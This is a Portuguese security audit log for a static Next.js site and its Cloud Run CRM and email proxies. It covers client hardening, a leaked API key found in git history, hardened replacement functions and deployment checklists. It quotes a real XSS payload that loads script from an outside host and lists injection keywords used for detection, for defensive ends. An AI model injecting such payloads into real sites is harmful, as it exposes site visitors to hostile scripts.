# Segurança — Webgex Site

Documento vivo de auditoria de segurança. Este arquivo registra o status atual,
as ações já executadas e o que ainda falta resolver (incluindo a parte no lado do
servidor/proxy no Google Cloud).

Última atualização: 2026-08-27

---

## Contexto da arquitetura

- **Site:** Next.js 15 (App Router), build 100% estático (`output: "export"`),
  publicados no bucket público GCS `gs://webgex-site` (projeto `webgex`) — ver `deploy.sh`.
- **Sem backend próprio:** não há `app/api/`, Server Actions nem route handlers.
- **Integrações externas** (via `fetch` no cliente, `lib/form-submit.ts`):
  - CRM proxy (Cloud Run): `POST` JSON para
    `https://webgex-crm-proxy-241464300074.southamerica-east1.run.app`
  - Email proxy (Cloud Run): `POST` multipart para
    `https://unigex-email-241464300074.southamerica-east1.run.app`
  - WhatsApp: navegação `GET` para `https://api.whatsapp.com/send?...`
  - Google Tag Manager / Google / Facebook (scripts de analytics)

**Ponto crítico:** toda a validação/sanitização de entrada hoje roda **no cliente**
(navegador) e é contornável. A defesa definitiva precisa existir **no servidor**
(na função/proxy que recebe os dados). Ver seção "Pendências no servidor".

---

## Ações já executadas (cliente — commit atual)

1. **Detecção de injeção XSS/SQL** — `lib/form-submit.ts`
   - Novo `containsMalicious()`: rejeita por completo o envio quando identifica
     `<script>`, `<iframe>`, `<object>`, handlers `onload/onerror/onclick/...`,
     `javascript:`, `data:text/html`, `<svg>`, e padrões SQL (`UNION SELECT`,
     `DROP TABLE`, `INSERT INTO`, `DELETE FROM`, `;--`, etc.).
   - Testado: bloqueia o payload real `"><script src=//ildl.uk/r></script>` e
     deixas dados legítimos passarem.
2. **Validação de e-mail no fluxo do CRM** — `lib/form-submit.ts` (`isValidEmail`).
3. **Validação de telefone** — `lib/form-submit.ts` (`isValidPhone`).
4. **`sanitize()` reforçado** — também escapa backtick `` ` `` e `\` além de `& < > " '`.
5. **`sendLeadToCRM` passa a retornar `boolean`** — os 5 formulários
   (`contact-form`, `lead-form`, `maturity-tool`, `blog-list`/newsletter,
   `scope-builder`) agora **abortam o redirecionamento ao WhatsApp** quando o
   envio é rejeitado (XSS/validação/rate-limit).
6. **Scope builder** — `buildProposalMessage` agora sanitiza nome/empresa/segmento
   na mensagem do WhatsApp (antes ia sem escape).
7. **Endpoint hardening**:
   - `next` 15.5.15 → **15.5.24** (patch de segurança).
   - `sharp` 0.34.5 → **0.35.4** (CVE libvips) via `overrides` no `package.json`.
8. **CSP endurecida** (`app/layout.tsx`):
   - Removido `'unsafe-eval'`.
   - Adicionados `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'none'`,
     `form-action 'self'`.
   - Mantido `'unsafe-inline'` (necessário para GTM/JSON-LD inline).
9. **`.gitignore`**: `.env`/`.env.local` → regra `*.env` / `*.env.*` (protege
   variações futuras).

Verificado: `tsc --noEmit` e `next build` (76 páginas) sem erros.

---

## Pendências no servidor (função/proxy no Google Cloud)

Estas pendências **não podem ser resolvidas no código cliente** deste repositório.
Precisam ser aplicadas na **função Cloud Run / Cloud Function** que recebe os dados
(CRM e e-mail), porque o cliente é contornável por qualquer solicitação manual.

Checklist (na ordem de prioridade):

### 1. (CRÍTICO) Revalidar e sanitizar no servidor
- Receber o payload do cliente e reaplicar no servidor:
  - **Escapar/esvaziar HTML** (`<`, `>`, `&`, `"`, `'`, `` ` ``, `\`) antes de
    gravar no CRM ou montar e-mail.
  - **Rejeitar payloads com `<script`, `javascript:`, handlers `on*`, padrões SQL**
    (mesma lógica do `containsMalicious()` do cliente).
  - Não confiar em nenhuma sanitização vinda do cliente.
- Registrar (log) e **rejeitar** (HTTP 4xx) payloads maliciosos, não apenas ignorar.

### 2. (CRÍTICO) Limitação de tamanho e conteúdo
- Truncar/cortar campos (nome ≤ ~120, empresa ≤ ~160, email ≤ ~254, mensagem ≤ ~2000/24000).
- Validar formato real de **e-mail** (padrão completo, não apenas presença de `@`).
- Validar **telefone**; se o campo não for obrigatório, aceitar vazio mas validar se preenchido.
- Limitar tamanho total do corpo da requisição.

### 3. (ALTA) Rate limiting no servidor
- O rate-limit atual é via `localStorage` do navegador — **contornável**.
- Implementar rate limiting no servidor por **IP** e/ou por campo de e-mail:
  - ex.: máx. N envios por IP por janela de tempo; máx. N envios para o mesmo e-mail.
- Considerar **reCAPTCHA** na página de contato para reduzir spam/bots.

### 4. (ALTA) Autenticação/restrição do endpoint
- Os endpoints Cloud Run são **públicos** e chamáveis diretamente de qualquer
  cliente. Avaliar:
  - Token/secreto compartilhado enviado por header (ex.: `Authorization`),
    mesmo que o endpoint seja público, para reduzir abuso automatizado.
  - OU restringir por origem (`Referer`/`Origin` permitido = domínio do site).
  - Evitar expor o endpoint de e-mail genericamente (é um vetor de spam relaying).

### 5. (MÉDIA) Headers de segurança no servidor do bucket
O site é servido de um bucket GCS público. Além da meta `Content-Security-Policy`
(que já é injetada no HTML via `app/layout.tsx`), garantir no servidor/edge:
- `X-Content-Type-Options: nosniff` (já há meta).
- `Referrer-Policy`, `Permissions-Policy` (já há meta).
- Idealmente mover a CSP para **header HTTP** no servidor (permite nonces) em vez
  de `<meta>` — depende da infraestrutura que serve o bucket (load balancer /
  Cloud CDN / proxy).

### 6. (MÉDIA) JSON-LD / strings dinâmicas
- Hoje mdados vem de fontes estáticas `lib/campaigns.ts` / `lib/blog-data.ts`,
  então `JSON.stringify` cru é seguro. **Se no futuro vierem de CMS/API/entrada**,
  os JSON-LD precisam escapar `<` como `\u003c` (senão `</script>` quebraria o
  contexto e viraria XSS). Aplicar o mesmo para o `dataLayer.push` em
  `app/campanha/[slug]/page.tsx`.

### 7. (MÉDIA) Dependências
- `postcss` transitivo do Next ainda reporta CVE (XSS/leak de arquivo via
  `sourceMappingURL`). Correção só no `next@16` (breaking). Como o PostCSS
  processa apenas CSS próprio no build (sem entrada de usuário), risco atual é
  baixo — **planejar upgrade futuro para Next 16**.
- Revisar periodicamente com `npm audit` no CI/deploy.

---

## Código das funções no Google Cloud (descoberto)

As duas funções/proxies **não estão documentadas nem versionadas neste repositório**
(atual). Porém, o **histórico do git** revelou a origem:

- Commit `67a9d61` — `index.js` (Cloud Function proxy do CRM) foi criado aqui.
- Commit `091f08b` — o `index.js` foi **removido** na migração p/ Next.js
  ("Migra site de HTML estático para Next.js"). O código da função está em outro
  lugar (repo separado e/ou apenas na infra do GCP).

### ⚠️ Problemas graves encontrados na Cloud Function (via histórico do git)

O `index.js` recuperado do histórico (`git show 67a9d61:index.js`) expõe:

1. **Chave de API da Webgex commitada no git (CRÍTICO):**
   - Header `WGX-API-KEY` (chave vazada no histórico do git — detalhes omitidos
     aqui para não re-expor a credencial; localizar via `git show 67a9d61:index.js`)
   - Alvo: `https://api-v2.webgex.com.br/erp-oportunidades`
   - Presente em 5 commits do histórico. **Provavelmente ainda ativa em produção.**
   - **AÇÃO NECESSÁRIA:** rotacionar/revogar essa chave e mover para o
     Secret Manager do GCP; nunca hardcodar/chamitar segredos.
2. **Sem validação/sanitização de entrada no servidor (CRÍTICO):**
   - `nome`, `email`, `telefone`, `classe` vêm direto de `req.body` e vão para a
     API Webgex **sem escapar HTML nem validar** formato.
   - Isso significa que o payload `"><script src=//ildl.uk/r></script>` **passa**
     direto pela função — a vulnerabilidade é real no lado do servidor.
3. **CORS aberto:** `Access-Control-Allow-Origin: *` (sem restrição de origem).
4. **Retorna HTTP 200 mesmo em erro** (esconde falhas e dificulta monitoramento).

### ✅ Função corrigida (criada neste repositório)

Com base no `index.js` recuperado, criei a versão enrijecida em:

- `cloud-functions/crm-proxy/index.js` — função corrigida
- `cloud-functions/crm-proxy/index.test.js` — 6 testes (todos passando)
- `cloud-functions/crm-proxy/README.md` — instruções de deploy e rotação de chave

Correções aplicadas:
- [x] Chave movida para `process.env.WGX_API_KEY` (nada de segredo no código).
- [x] Validação/rejeição de XSS e SQL (`<script>`, `javascript:`, `on*`, `UNION`
      etc.), validação de e-mail, escape de HTML em todos os campos.
- [x] CORS restrito a `ALLOWED_ORIGINS` (padrão `webgex.com.br`).
- [x] Retorna status HTTP corretos (400/405/429/500/502).
- [x] Rate limit por IP (8 / 10 min) e truncamento de campos.

> **ATENÇÃO:** ajuste `ALLOWED_ORIGINS` em `index.js` para os domínios reais
> antes de implantar.

### ✅ Proxy de e-mail corrigido (criado neste repositório)

- `cloud-functions/email-proxy/index.php` — função corrigida (PHP)
- `cloud-functions/email-proxy/security.php` — helpers validados
- `cloud-functions/email-proxy/index.test.php` — 18 testes (passando)
- `cloud-functions/email-proxy/README.md` — deploy e variáveis de ambiente

Correções aplicadas:
- [x] Senha SMTP removida do código → `SMTP_SENHA` (variável de ambiente).
- [x] CORS restrito a `ALLOWED_ORIGINS` (era `*`, permitia spam relay).
- [x] Rate limit por IP (8 / 10 min) — antes podia enviar e-mails em massa.
- [x] Validação de e-mail e rejeição de XSS/SQLi no corpo/assunto.
- [x] Aceita `subject`/`bcc` vindos do site (fallback p/ padrão de maturidade).
- [x] Retorna status HTTP corretos (400/405/429/500/502), sem vazar a resposta
      interna do xMailer.

### Roteiro de execução (pendências em ordem)

Contexto confirmado: **as duas funções são Cloud Run** (`*.run.app`).
Deploy é **separado** do site (site → bucket GCS via `deploy.sh`; funções → Cloud Run manual).

**Resolvido até aqui:**
- [x] Função CRM corrigida (`cloud-functions/crm-proxy/`)
- [x] Função de e-mail corrigida (`cloud-functions/email-proxy/`)
- [x] Segredos criados no Secret Manager (Bloco 1)

**Bloco 1 — Segredos no GCP (cronograma):** (veja seção "Bloco 1 — Secret Manager" abaixo)

**Bloco 2 — Deploy do site (client-side) → bucket GCS:**
- [x] `npm install` (Next 15.5.24 + sharp)
- [ ] Commit das mudanças do site (`lib/form-submit.ts`, 5 formulários, `app/layout.tsx`,
      `package.json`, `.gitignore`, `SECURITY.md`)
- [x] `./deploy.sh` (deploy para `gs://webgex-site`) — **upload realizado**

**Bloco 3 — Deploy das funções corrigidas (Cloud Run):**
- [x] Implantar `cloud-functions/email-proxy/index.php` no Cloud Run de e-mail,
      conectando o secret `SMTP_SENHA` — **feito e testado (400/405/400 OK)**
- [x] Implantar `cloud-functions/crm-proxy/index.js` no Cloud Run `webgex-crm-proxy`,
      conectando o secret `WGX_API_KEY` — **feito e testado (400/405 OK)**
- [x] Ajustar `ALLOWED_ORIGINS` nas duas funções — **OK: domínio real é www.webgex.com.br,
      e ambos os códigos já permitem `https://www.webgex.com.br` e `https://webgex.com.br`**
- [ ] Testar com payload legítimo (e confirmar que payload XSS dá 400)

**Bloco 4 — Rotação das credenciais vazadas (POR ÚLTIMO, como pedido):**
- [x] Rotacionar a chave `WGX-API-KEY` em `api-v2.webgex.com.br`
      — **feita e implementada; teste de funcionalidade executado (CORS OK,
      validação/rate-limit OK, chave definida OK; 502 = API Webgex recusou o
      lead de teste, pendente investigação manual do payload na API)**
- [ ] Rotacionar a senha SMTP
- [ ] Atualizar os novos valores no Secret Manager (nova versão do segredo)
      — `WGX_API_KEY`: nova versão salva; `SMTP_SENHA`: pendente
- [ ] Confirmar que as URLs dos serviços permanecem as mesmas em
      `lib/form-submit.ts:1` e `lib/form-submit.ts:134`

---

### Bloco 1 — Segredos no Secret Manager (GCP, via console web)

As duas funções são **Cloud Run**. Cadastramos os segredos ANTES de implantar os
proxies corrigidos, para não quebrar a integração.

- [x] Criado o segredo `WGX_API_KEY` (valor atual — sem rotacionar ainda)
- [x] Criado o segredo `SMTP_SENHA` (valor atual — sem rotacionar ainda)

**Pendente (fazer junto do Bloco 3, no próprio deploy):**
- [ ] Conectar `WGX_API_KEY` ao Cloud Run do CRM
- [ ] Conectar `SMTP_SENHA` ao Cloud Run de e-mail

> Preferimos NÃO "implantar nova revisão" só para conectar a env var enquanto o
> serviço ainda roda o código antigo — será feito junto do deploy da versão corrigida.

---

## Como analisar a função no Google Cloud

Para continuar a resolução no lado do servidor, precisamos de acesso ao código da
função/proxy. Info para coleta:

- Qual o projeto GCP? (deploy.sh usa `gs://webgex-site` / projeto `webgex`)
- Os dois endpoints são **Cloud Function** ou **Cloud Run**?
  - `https://webgex-crm-proxy-...run.app`
  - `https://unigex-email-...run.app`
  (sufixo `.run.app` indica Cloud Run; Cloud Function v1 usaria `*.cloudfunctions.net`.)
- Onde está o código-fonte (repo/GitHub), build e variáveis de ambiente?
- Quais tabelas/destinos internos (CRM) e serviço de e-mail o proxy usa?

Comandos úteis (requer `gcloud` autenticado):
```bash
gcloud functions list --project=webgex
gcloud run services list --project=webgex
# Baixar o código de uma Cloud Function v2:
gcloud functions describe crm-proxy --project=webgex --format='value(serviceConfig.sourceControlUrl)'
# ou pelo deploy:
gcloud functions deploy --source ./proxy-crm ...
```

---

## Recursos para referência
- OWASP: XSS Prevention Cheat Sheet, SQL Injection Prevention, CSRF Prevention.
- Google Cloud: Auth VPN / IAP / Cloud Armor para proteger os endpoints.
